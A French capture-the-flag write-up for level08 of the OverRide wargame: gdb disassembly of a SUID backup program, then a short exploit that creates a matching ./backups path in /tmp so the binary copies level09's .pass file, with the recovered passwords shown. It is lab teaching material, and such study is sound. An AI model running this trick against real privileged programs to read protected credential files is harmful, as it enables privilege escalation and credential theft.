## 1: Analyse

### A: C'est quoi mon binaire?
* Bon vous commencez a comprendre mon workflow maintenant. Regardez les exercices precedents si vous comprenez pas.

```shell
level07@OverRide:/tmp$ su level08
  Password:7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08

level08@OverRide:~$ ls -la
  total 28
  dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
  dr-x--x--x  1 root    root      260 Oct  2  2016 ..
  drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
  -r--------  1 level08 level08     0 Oct 19  2016 .bash_history
  -rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
  lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
  -rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
  -rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
  -rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
  -rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
  -r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
level08@OverRide:~$ ./level08
  Usage: ./level08 filename
  ERROR: Failed to open (null)

level08@OverRide:~$ ./level08 level08
```

* On a un binaire appartenant a level09 dans le home avec les droits SUID...
* ... qui print un usage sans params ...
* ... qui fait rien avec n'importe quel fichier ...
* ... on va donc devoir lui envoyer un fichier en particulier ...

### B: On l'ouvre avec gdb

* Pareil pour ici regardez les exos precedents si vous comprenez pas ce que je fais

```shell
level08@OverRide:~$ cd /tmp

level08@OverRide:/tmp$ gdb ~/level08
  GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
  Copyright (C) 2012 Free Software Foundation, Inc.
  License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
  This is free software: you are free to change and redistribute it.
  There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
  and "show warranty" for details.
  This GDB was configured as "x86_64-linux-gnu".
  For bug reporting instructions, please see:
  <http://bugs.launchpad.net/gdb-linaro/>...
  Reading symbols from /home/users/level08/level08...(no debugging symbols found)...done.

gdb-peda$ info functions
  All defined functions:

  Non-debugging symbols:
  0x00000000004006c0  _init
  0x00000000004006f0  strcpy
  0x00000000004006f0  strcpy@plt
  0x0000000000400700  write
  0x0000000000400700  write@plt
  0x0000000000400710  fclose
  0x0000000000400710  fclose@plt
  0x0000000000400720  __stack_chk_fail
  0x0000000000400720  __stack_chk_fail@plt
  0x0000000000400730  printf
  0x0000000000400730  printf@plt
  0x0000000000400740  snprintf
  0x0000000000400740  snprintf@plt
  0x0000000000400750  strncat
  0x0000000000400750  strncat@plt
  0x0000000000400760  fgetc
  0x0000000000400760  fgetc@plt
  0x0000000000400770  close
  0x0000000000400770  close@plt
  0x0000000000400780  strcspn
  0x0000000000400780  strcspn@plt
  0x0000000000400790  __libc_start_main
  0x0000000000400790  __libc_start_main@plt
  0x00000000004007a0  fprintf
  0x00000000004007a0  fprintf@plt
  0x00000000004007b0  open
  0x00000000004007b0  open@plt
  0x00000000004007c0  fopen
  0x00000000004007c0  fopen@plt
  0x00000000004007d0  exit
  0x00000000004007d0  exit@plt
  0x00000000004007e0  _start
  0x000000000040080c  call_gmon_start
  0x0000000000400830  __do_global_dtors_aux
  0x00000000004008a0  frame_dummy
  0x00000000004008c4  log_wrapper
  0x00000000004009f0  main
  0x0000000000400c60  __libc_csu_init
  0x0000000000400cf0  __libc_csu_fini
  0x0000000000400d00  __do_global_ctors_aux
  0x0000000000400d38  _fini

gdb-peda$ pdisas main
  Dump of assembler code for function main:
  # OH! Le retour des registres 64 bits
  # Initialisation, allocation de 176 octets, save argc/argv/canary, eax=0
  0x00000000004009f0 <+0>:	push   rbp
  0x00000000004009f1 <+1>:	mov    rbp,rsp
  0x00000000004009f4 <+4>:	sub    rsp,0xb0
  0x00000000004009fb <+11>:	mov    DWORD PTR [rbp-0x94],edi
  0x0000000000400a01 <+17>:	mov    QWORD PTR [rbp-0xa0],rsi
  0x0000000000400a08 <+24>:	mov    rax,QWORD PTR fs:0x28
  0x0000000000400a11 <+33>:	mov    QWORD PTR [rbp-0x8],rax
  0x0000000000400a15 <+37>:	xor    eax,eax

  # char c = EOF, number2 = -1
  0x0000000000400a17 <+39>:	mov    BYTE PTR [rbp-0x71],0xff
  0x0000000000400a1b <+43>:	mov    DWORD PTR [rbp-0x78],0xffffffff

  # if argc != 2 printf("Usage: %s filename\n", argv[0])
  0x0000000000400a22 <+50>:	cmp    DWORD PTR [rbp-0x94],0x2
  0x0000000000400a29 <+57>:	je     0x400a4a <main+90>
  0x0000000000400a2b <+59>:	mov    rax,QWORD PTR [rbp-0xa0]
  0x0000000000400a32 <+66>:	mov    rdx,QWORD PTR [rax]
  0x0000000000400a35 <+69>:	mov    eax,0x400d57
  0x0000000000400a3a <+74>:	mov    rsi,rdx
  0x0000000000400a3d <+77>:	mov    rdi,rax
  0x0000000000400a40 <+80>:	mov    eax,0x0
  0x0000000000400a45 <+85>:	call   0x400730 <printf@plt>

  # FILE *fd = fopen("./backups/.log", "w")
  0x0000000000400a4a <+90>:	mov    edx,0x400d6b
  0x0000000000400a4f <+95>:	mov    eax,0x400d6d
  0x0000000000400a54 <+100>:	mov    rsi,rdx
  0x0000000000400a57 <+103>:	mov    rdi,rax
  0x0000000000400a5a <+106>:	call   0x4007c0 <fopen@plt>
  0x0000000000400a5f <+111>:	mov    QWORD PTR [rbp-0x88],rax

  # if (fd_log == 0)
  #     printf("ERROR: Failed to open %s\n", "./backups/.log");
  #     exit(1);
  0x0000000000400a66 <+118>:	cmp    QWORD PTR [rbp-0x88],0x0
  0x0000000000400a6e <+126>:	jne    0x400a91 <main+161>
  0x0000000000400a70 <+128>:	mov    eax,0x400d7c
  0x0000000000400a75 <+133>:	mov    esi,0x400d6d
  0x0000000000400a7a <+138>:	mov    rdi,rax
  0x0000000000400a7d <+141>:	mov    eax,0x0
  0x0000000000400a82 <+146>:	call   0x400730 <printf@plt>
  0x0000000000400a87 <+151>:	mov    edi,0x1
  0x0000000000400a8c <+156>:	call   0x4007d0 <exit@plt>

  # log_wrapper(fd_log, "Starting back up: ", argv[1])
  0x0000000000400a91 <+161>:	mov    rax,QWORD PTR [rbp-0xa0]
  0x0000000000400a98 <+168>:	add    rax,0x8
  0x0000000000400a9c <+172>:	mov    rdx,QWORD PTR [rax]
  0x0000000000400a9f <+175>:	mov    rax,QWORD PTR [rbp-0x88]
  0x0000000000400aa6 <+182>:	mov    esi,0x400d96
  0x0000000000400aab <+187>:	mov    rdi,rax
  0x0000000000400aae <+190>:	call   0x4008c4 <log_wrapper>

  # fd_arg = fopen(argv[1], "r");
  0x0000000000400ab3 <+195>:	mov    edx,0x400da9
  0x0000000000400ab8 <+200>:	mov    rax,QWORD PTR [rbp-0xa0]
  0x0000000000400abf <+207>:	add    rax,0x8
  0x0000000000400ac3 <+211>:	mov    rax,QWORD PTR [rax]
  0x0000000000400ac6 <+214>:	mov    rsi,rdx
  0x0000000000400ac9 <+217>:	mov    rdi,rax
  0x0000000000400acc <+220>:	call   0x4007c0 <fopen@plt>
  0x0000000000400ad1 <+225>:	mov    QWORD PTR [rbp-0x80],rax

  # if fd_arg == 0
  #     printf("ERROR: Failed to open %s\n", argv[1]);
  #     exit(1);
  0x0000000000400ad5 <+229>:	cmp    QWORD PTR [rbp-0x80],0x0
  0x0000000000400ada <+234>:	jne    0x400b09 <main+281>
  0x0000000000400adc <+236>:	mov    rax,QWORD PTR [rbp-0xa0]
  0x0000000000400ae3 <+243>:	add    rax,0x8
  0x0000000000400ae7 <+247>:	mov    rdx,QWORD PTR [rax]
  0x0000000000400aea <+250>:	mov    eax,0x400d7c
  0x0000000000400aef <+255>:	mov    rsi,rdx
  0x0000000000400af2 <+258>:	mov    rdi,rax
  0x0000000000400af5 <+261>:	mov    eax,0x0
  0x0000000000400afa <+266>:	call   0x400730 <printf@plt>
  0x0000000000400aff <+271>:	mov    edi,0x1
  0x0000000000400b04 <+276>:	call   0x4007d0 <exit@plt>

  # strcpy(param_in_backup_name[100], "./backups/")
  0x0000000000400b09 <+281>:	mov    edx,0x400dab
  0x0000000000400b0e <+286>:	lea    rax,[rbp-0x70]
  0x0000000000400b12 <+290>:	mov    rcx,QWORD PTR [rdx]
  0x0000000000400b15 <+293>:	mov    QWORD PTR [rax],rcx
  0x0000000000400b18 <+296>:	movzx  ecx,WORD PTR [rdx+0x8]
  0x0000000000400b1c <+300>:	mov    WORD PTR [rax+0x8],cx
  0x0000000000400b20 <+304>:	movzx  edx,BYTE PTR [rdx+0xa]
  0x0000000000400b24 <+308>:	mov    BYTE PTR [rax+0xa],dl
  0x0000000000400b27 <+311>:	lea    rax,[rbp-0x70]
  0x0000000000400b2b <+315>:	mov    QWORD PTR [rbp-0xa8],0xffffffffffffffff
  0x0000000000400b36 <+326>:	mov    rdx,rax
  0x0000000000400b39 <+329>:	mov    eax,0x0
  0x0000000000400b3e <+334>:	mov    rcx,QWORD PTR [rbp-0xa8]
  0x0000000000400b45 <+341>:	mov    rdi,rdx
  0x0000000000400b48 <+344>:	repnz scas al,BYTE PTR es:[rdi]

  # strncat(param_in_backup_name, argv[1], 100 - strlen(param_in_backup_name))
  0x0000000000400b4a <+346>:	mov    rax,rcx
  0x0000000000400b4d <+349>:	not    rax
  0x0000000000400b50 <+352>:	lea    rdx,[rax-0x1]
  0x0000000000400b54 <+356>:	mov    eax,0x63
  0x0000000000400b59 <+361>:	mov    rcx,rax
  0x0000000000400b5c <+364>:	sub    rcx,rdx
  0x0000000000400b5f <+367>:	mov    rdx,rcx
  0x0000000000400b62 <+370>:	mov    rax,QWORD PTR [rbp-0xa0]
  0x0000000000400b69 <+377>:	add    rax,0x8
  0x0000000000400b6d <+381>:	mov    rax,QWORD PTR [rax]
  0x0000000000400b70 <+384>:	mov    rcx,rax
  0x0000000000400b73 <+387>:	lea    rax,[rbp-0x70]
  0x0000000000400b77 <+391>:	mov    rsi,rcx
  0x0000000000400b7a <+394>:	mov    rdi,rax
  0x0000000000400b7d <+397>:	call   0x400750 <strncat@plt>

  # Je n'ai pas réussi a trouver la signification des flags
  # full_fd = open(param_in_backup_name, 193, 432);
  0x0000000000400b82 <+402>:	lea    rax,[rbp-0x70]
  0x0000000000400b86 <+406>:	mov    edx,0x1b0
  0x0000000000400b8b <+411>:	mov    esi,0xc1
  0x0000000000400b90 <+416>:	mov    rdi,rax
  0x0000000000400b93 <+419>:	mov    eax,0x0
  0x0000000000400b98 <+424>:	call   0x4007b0 <open@plt>
  0x0000000000400b9d <+429>:	mov    DWORD PTR [rbp-0x78],eax

  # if full_fd == 0
  #     printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1])
  #     exit(1)
  0x0000000000400ba0 <+432>:	cmp    DWORD PTR [rbp-0x78],0x0
  0x0000000000400ba4 <+436>:	jns    0x400bed <main+509>
  0x0000000000400ba6 <+438>:	mov    rax,QWORD PTR [rbp-0xa0]
  0x0000000000400bad <+445>:	add    rax,0x8
  0x0000000000400bb1 <+449>:	mov    rdx,QWORD PTR [rax]
  0x0000000000400bb4 <+452>:	mov    eax,0x400db6
  0x0000000000400bb9 <+457>:	mov    esi,0x400dab
  0x0000000000400bbe <+462>:	mov    rdi,rax
  0x0000000000400bc1 <+465>:	mov    eax,0x0
  0x0000000000400bc6 <+470>:	call   0x400730 <printf@plt>
  0x0000000000400bcb <+475>:	mov    edi,0x1
  0x0000000000400bd0 <+480>:	call   0x4007d0 <exit@plt>

  # do
  # ... write(full_fd, c, 1);
  0x0000000000400bd5 <+485>:	lea    rcx,[rbp-0x71]
  0x0000000000400bd9 <+489>:	mov    eax,DWORD PTR [rbp-0x78]
  0x0000000000400bdc <+492>:	mov    edx,0x1
  0x0000000000400be1 <+497>:	mov    rsi,rcx
  0x0000000000400be4 <+500>:	mov    edi,eax
  0x0000000000400be6 <+502>:	call   0x400700 <write@plt>

  # ... useless
  0x0000000000400beb <+507>:	jmp    0x400bee <main+510>
  0x0000000000400bed <+509>:	nop

  # ... c = fgetc(fd_arg)
  0x0000000000400bee <+510>:	mov    rax,QWORD PTR [rbp-0x80]
  0x0000000000400bf2 <+514>:	mov    rdi,rax
  0x0000000000400bf5 <+517>:	call   0x400760 <fgetc@plt>

  # while(c != EOF)
  0x0000000000400bfa <+522>:	mov    BYTE PTR [rbp-0x71],al
  0x0000000000400bfd <+525>:	movzx  eax,BYTE PTR [rbp-0x71]
  0x0000000000400c01 <+529>:	cmp    al,0xff
  0x0000000000400c03 <+531>:	jne    0x400bd5 <main+485>

  # log_wrapper(fd_log, "Finished back up ", argv[1]);
  0x0000000000400c05 <+533>:	mov    rax,QWORD PTR [rbp-0xa0]
  0x0000000000400c0c <+540>:	add    rax,0x8
  0x0000000000400c10 <+544>:	mov    rdx,QWORD PTR [rax]
  0x0000000000400c13 <+547>:	mov    rax,QWORD PTR [rbp-0x88]
  0x0000000000400c1a <+554>:	mov    esi,0x400dd2
  0x0000000000400c1f <+559>:	mov    rdi,rax
  0x0000000000400c22 <+562>:	call   0x4008c4 <log_wrapper>

  # fclose(fd_arg)
  0x0000000000400c27 <+567>:	mov    rax,QWORD PTR [rbp-0x80]
  0x0000000000400c2b <+571>:	mov    rdi,rax
  0x0000000000400c2e <+574>:	call   0x400710 <fclose@plt>

  # close(full_fd)
  0x0000000000400c33 <+579>:	mov    eax,DWORD PTR [rbp-0x78]
  0x0000000000400c36 <+582>:	mov    edi,eax
  0x0000000000400c38 <+584>:	call   0x400770 <close@plt>

  # check canary et return
  0x0000000000400c3d <+589>:	mov    eax,0x0
  0x0000000000400c42 <+594>:	mov    rdi,QWORD PTR [rbp-0x8]
  0x0000000000400c46 <+598>:	xor    rdi,QWORD PTR fs:0x28
  0x0000000000400c4f <+607>:	je     0x400c56 <main+614>
  0x0000000000400c51 <+609>:	call   0x400720 <__stack_chk_fail@plt>
  0x0000000000400c56 <+614>:	leave
  0x0000000000400c57 <+615>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
gdb-peda$ x/s 0x400d57
  0x400d57:	 "Usage: %s filename\n"
gdb-peda$ x/s 0x400d6b
  0x400d6b:	 "w"
gdb-peda$ x/s 0x400d6d
  0x400d6d:	 "./backups/.log"
gdb-peda$ x/s 0x400d7c
  0x400d7c:	 "ERROR: Failed to open %s\n"
gdb-peda$ x/s 0x400d96
  0x400d96:	 "Starting back up: "
gdb-peda$ x/s 0x400da9
  0x400da9:	 "r"
gdb-peda$ x/s 0x400dab
  0x400dab:	 "./backups/"
gdb-peda$ x/s 0x400db6
  0x400db6:	 "ERROR: Failed to open %s%s\n"
gdb-peda$ x/s 0x400dab
  0x400dab:	 "./backups/"
gdb-peda$ x/s 0x400dd2
  0x400dd2:	 "Finished back up "
```

* On passe sur log_wrapper
```shell
gdb-peda$ pdisas log_wrapper
  Dump of assembler code for function log_wrapper:
  # Initialise, alloue 304
  0x00000000004008c4 <+0>:	push   rbp
  0x00000000004008c5 <+1>:	mov    rbp,rsp
  0x00000000004008c8 <+4>:	sub    rsp,0x130

  # Met les arguments et la canary sur la stack, initialise eax
  0x00000000004008cf <+11>:	mov    QWORD PTR [rbp-0x118],rdi # On va l'appeler fd
  0x00000000004008d6 <+18>:	mov    QWORD PTR [rbp-0x120],rsi # on va l'appeler message
  0x00000000004008dd <+25>:	mov    QWORD PTR [rbp-0x128],rdx # on va l'appeler filename
  0x00000000004008e4 <+32>:	mov    rax,QWORD PTR fs:0x28
  0x00000000004008ed <+41>:	mov    QWORD PTR [rbp-0x8],rax
  0x00000000004008f1 <+45>:	xor    eax,eax
  
  # strcpy(full_log, message);
  0x00000000004008f3 <+47>:	mov    rdx,QWORD PTR [rbp-0x120]
  0x00000000004008fa <+54>:	lea    rax,[rbp-0x110]
  0x0000000000400901 <+61>:	mov    rsi,rdx
  0x0000000000400904 <+64>:	mov    rdi,rax
  0x0000000000400907 <+67>:	call   0x4006f0 <strcpy@plt>

  # snprintf(&full_log[strlen(ful_log)], 254 - strlen(log), filename);
  0x000000000040090c <+72>:	mov    rsi,QWORD PTR [rbp-0x128]
  0x0000000000400913 <+79>:	lea    rax,[rbp-0x110]
  0x000000000040091a <+86>:	mov    QWORD PTR [rbp-0x130],0xffffffffffffffff
  0x0000000000400925 <+97>:	mov    rdx,rax
  0x0000000000400928 <+100>:	mov    eax,0x0
  0x000000000040092d <+105>:	mov    rcx,QWORD PTR [rbp-0x130]
  0x0000000000400934 <+112>:	mov    rdi,rdx
  0x0000000000400937 <+115>:	repnz scas al,BYTE PTR es:[rdi]
  0x0000000000400939 <+117>:	mov    rax,rcx
  0x000000000040093c <+120>:	not    rax
  0x000000000040093f <+123>:	lea    rdx,[rax-0x1]
  0x0000000000400943 <+127>:	mov    eax,0xfe
  0x0000000000400948 <+132>:	mov    r8,rax
  0x000000000040094b <+135>:	sub    r8,rdx
  0x000000000040094e <+138>:	lea    rax,[rbp-0x110]
  0x0000000000400955 <+145>:	mov    QWORD PTR [rbp-0x130],0xffffffffffffffff
  0x0000000000400960 <+156>:	mov    rdx,rax
  0x0000000000400963 <+159>:	mov    eax,0x0
  0x0000000000400968 <+164>:	mov    rcx,QWORD PTR [rbp-0x130]
  0x000000000040096f <+171>:	mov    rdi,rdx
  0x0000000000400972 <+174>:	repnz scas al,BYTE PTR es:[rdi]
  0x0000000000400974 <+176>:	mov    rax,rcx
  0x0000000000400977 <+179>:	not    rax
  0x000000000040097a <+182>:	lea    rdx,[rax-0x1]
  0x000000000040097e <+186>:	lea    rax,[rbp-0x110]
  0x0000000000400985 <+193>:	add    rax,rdx
  0x0000000000400988 <+196>:	mov    rdx,rsi
  0x000000000040098b <+199>:	mov    rsi,r8
  0x000000000040098e <+202>:	mov    rdi,rax
  0x0000000000400991 <+205>:	mov    eax,0x0
  0x0000000000400996 <+210>:	call   0x400740 <snprintf@plt>

  # full_log[strcspn(full_log, "\n")] = 0;
  0x000000000040099b <+215>:	lea    rax,[rbp-0x110]
  0x00000000004009a2 <+222>:	mov    esi,0x400d4c
  0x00000000004009a7 <+227>:	mov    rdi,rax
  0x00000000004009aa <+230>:	call   0x400780 <strcspn@plt>
  0x00000000004009af <+235>:	mov    BYTE PTR [rbp+rax*1-0x110],0x0

  # fprintf(fd, "LOG: %s\n", full_log);
  0x00000000004009b7 <+243>:	mov    ecx,0x400d4e
  0x00000000004009bc <+248>:	lea    rdx,[rbp-0x110]
  0x00000000004009c3 <+255>:	mov    rax,QWORD PTR [rbp-0x118]
  0x00000000004009ca <+262>:	mov    rsi,rcx
  0x00000000004009cd <+265>:	mov    rdi,rax
  0x00000000004009d0 <+268>:	mov    eax,0x0
  0x00000000004009d5 <+273>:	call   0x4007a0 <fprintf@plt>

  # check stack et return
  0x00000000004009da <+278>:	mov    rax,QWORD PTR [rbp-0x8]
  0x00000000004009de <+282>:	xor    rax,QWORD PTR fs:0x28
  0x00000000004009e7 <+291>:	je     0x4009ee <log_wrapper+298>
  0x00000000004009e9 <+293>:	call   0x400720 <__stack_chk_fail@plt>
  0x00000000004009ee <+298>:	leave
  0x00000000004009ef <+299>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
gdb-peda$ x/s 0x400d4c
  0x400d4c:	 "\n"
gdb-peda$ x/s 0x400d4e
  0x400d4e:	 "LOG: %s\n"
```

## 2: Comportement

* Ok, donc on a un programme qui prend un nom de fichier en argument ...
* ... et qui va copier son contenu dans le dossier backups ...
* ... et logger dans backup/.logs si tout s'est bien passé ...

## 3: Exploit

### A: Explication

> Ici, pas de failles. On essaye juste de lui faire copier le contenu du .pass du level09

### B: Creation de l'exploit

```shell
level08@OverRide:~$ ./level08 /home/users/level09/.pass
  ERROR: Failed to open ./backups//home/users/level09/.pass

# On n'arrive pas a l'ouvrir.
# Or on voit dans le binaire que le path est relatif à où on l'execute
# On ne peut pas creer de fichiers / dossiers dans le ~ donc on va dans tmp
level08@OverRide:~$ cd /tmp

# On cree le path demandé par le binaire
level08@OverRide:/tmp$ mkdir -p backups//home/users/level09/

# On relance la commande depuis tmp
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass

# On check que ca aie marché
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
  fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

level08@OverRide:/tmp$ su level09
  Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09

level09@OverRide:~$
```